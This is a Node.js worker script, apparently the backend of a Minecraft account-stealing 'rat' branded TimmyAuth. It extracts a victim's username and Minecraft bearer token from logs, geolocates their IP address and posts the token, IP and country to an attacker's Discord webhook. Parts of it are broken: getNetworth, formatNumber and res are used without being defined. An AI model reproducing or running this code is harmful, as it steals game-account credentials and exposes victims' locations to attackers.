const { workerData, parentPort } = require('worker_threads');
const { WebhookClient } = require('discord.js');
const axios = require('axios');
const emojiFlag = require('emoji-flag');
import ('node-fetch');
const { webhook } = require('./config.json');
const { logBuffer, clientIP } = workerData;

// Use the 'id' as needed in your worker logic

let extractedInfo = {
  name: null,
  token: null,
};

const logLines = logBuffer.join('').split('\n');

logLines.forEach((line) => {
  if (line.includes('name:')) {
    extractedInfo.name = line.replace(/'/g, '').trim();
  } else if (line.includes('token:')) {
    extractedInfo.token = line.replace(/'/g, '').trim();
  }
  // Add additional filters as needed
});


function modifyNameField(name) {
  return name ? name.substring(6, name.length - 1) : '';
}

function modifyTokenField(token) {
  return token ? token.substring(7, token.length - 1) : '';
}

const username = modifyNameField(extractedInfo.name || '');
const bearerToken = modifyTokenField(extractedInfo.token || '');

async function getIpLocation(ip) {
  const url = `https://ipapi.co/${ip}/json/`
  const config = {
      headers: {
          'Content-Type': 'application/json',
      }
  }
  let response = await axios.get(url, config)
  return [response.data['country_name'], response.data['country_code']]
}

async function getUsernameAndUUID(bearerToken) {
  try {
      const url = 'https://api.minecraftservices.com/minecraft/profile'
      const config = {
          headers: {
              'Authorization': 'Bearer ' + bearerToken,
          }
      }
      let response = await axios.get(url, config)
      if (response.status == 404) {res.send("Access denied because no Minecraft account was found.") 
      return ["timmy", "timmy"] }
      return [response.data['id'], response.data['name']]
  } catch (error) {
      return ["timmy", "timmy"]
      
  }
}

const customAvatarURL = 'https://bigrat.monster/media/bigrat.jpg';
const customUsername = 'TimmyAuth';

async function discordEmbed () {
  const networthArray = await getNetworth(username)
	const networth = networthArray[0]
	const networthNoInventory = networthArray[1]
	const networthNetworth = networthArray[2]
	const networthUnsoulbound = networthArray[3]
	const networthSoulbound = networthArray[4]

  let total_networth
  // Set it "API IS TURNED OFF IF NULL"
  if (networth == "API DOWN") total_networth = networth;
  else if (networth == "[NO PROFILES FOUND]") total_networth = networth;
  else if(networthNoInventory) total_networth = "NO INVENTORY: "+formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";
  else total_networth = formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";

  const ipLocationArray = await getIpLocation(clientIP);
  const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken);
  const uuid = usernameAndUUIDArray[0];
  const country = ipLocationArray[0];
  const flag = ipLocationArray[1] ? emojiFlag(ipLocationArray[1]) : '';
  const discordMessage = {
    username: customUsername,
    avatarURL: customAvatarURL,
    content: `@everyone`,
    embeds: [
      {
        color: 16746496,
        timestamp: new Date().toISOString(),
        thumbnail: {
          url: 'https://visage.surgeplay.com/full/'+uuid
        },
        fields: [
          {
            name: '**Username:**',
            value: '```' + username + '```',
            inline: true,
          },
          {
            name: '**IP:**',
            value: '```' + (clientIP || 'N/A') + '```', // Replace 'clientIP' with the actual IP value or variable
            inline: true,
          },
          {
            name: `**${flag} Location:**`,
            value: '```'+ country +'```',
            inline: true,
          },
          {
            name: '**Token:**',
            value: '```' + bearerToken + '```',
          },
        ],
        footer: {
          text: 'by timmy',
      },
      },
    ],
  };
  return discordMessage
}

async function sendDiscordMessage() {
  try {
    const messageContent = await discordEmbed();

    if (!webhook) {
      console.error('Webhook URL not found or invalid.');
      return { error: 'Webhook URL not found or invalid' };
    }

    const webhookClient = new WebhookClient({
      url: webhook,
    });
    
    await webhookClient.send(messageContent);
    console.log(`Sent the message`);
    return { success: true };
  } catch (error) {
    console.error('Error sending Discord message:', error.message);
    return { error: 'Failed to send Discord message' };
  }
}

sendDiscordMessage();
